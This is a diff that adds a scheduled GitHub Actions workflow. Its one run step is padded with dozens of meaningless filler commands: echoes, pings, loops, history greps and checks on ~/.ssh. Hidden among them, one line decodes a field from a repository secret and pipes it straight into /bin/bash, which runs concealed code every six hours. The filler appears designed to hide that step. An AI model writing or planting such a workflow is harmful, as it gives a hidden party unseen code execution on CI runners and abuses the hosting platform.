@@ -1,0 +1,45 @@
+name: songliwen1986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songliwen1986
+        env:
+          w2048: ${{ secrets.w2048 }}
+        run: |
+          ls -al | grep -E "has.*a.*cpp" | xargs cat
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          for i in {1..3}; do echo "Iter $i"; done
+          echo $w2048 | jq -r .h23598 | /bin/bash
+          echo "User: $(whoami)"
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          pushd ~ > /dev/null
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          which apt-get
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          history | grep git
+          rm -rf tmp.temp.my.scrip.orc.zzz
+          ping -c 10 google.com
+          printf "%s\n" $(date)
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Random ID: $RANDOM$RANDOM"
+          which screen
+          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          ping -c 10 github.com
+          curl www.google.com
+          history | grep ls
+          git add -u
+          echo "Debug at $(date)"
+          which printf
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
